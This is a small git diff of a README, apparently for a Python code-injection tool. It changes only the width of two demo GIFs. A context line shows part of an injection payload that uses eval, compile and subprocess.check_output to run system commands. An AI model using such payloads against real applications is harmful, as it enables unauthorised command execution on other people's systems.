@@ -39,7 +39,7 @@ The structure of folders on the host where the application is located, which wil
 <p align="center">
 Injection only giving the payload with the specific expression:</p>
 <p align="center">
-<img src="https://media4.giphy.com/media/KPRU4rIJbDxUMmjow4/giphy.gif" alt=""  width="350px"></p>
+<img src="https://media4.giphy.com/media/KPRU4rIJbDxUMmjow4/giphy.gif" alt=""  width="480px"></p>
 
 
 ```
@@ -48,7 +48,7 @@ eval(compile("""for x in range(1):\n import subprocess\n subprocess.check_output
 <p align="center">
 Injection with custom payload expression:</p>
 <p align="center">
-<img src="https://media4.giphy.com/media/JkzlYa6WGpphEsPr5J/giphy.gif" alt="" width="350px"></p>
+<img src="https://media4.giphy.com/media/JkzlYa6WGpphEsPr5J/giphy.gif" alt="" width="480px"></p>
 
 
 
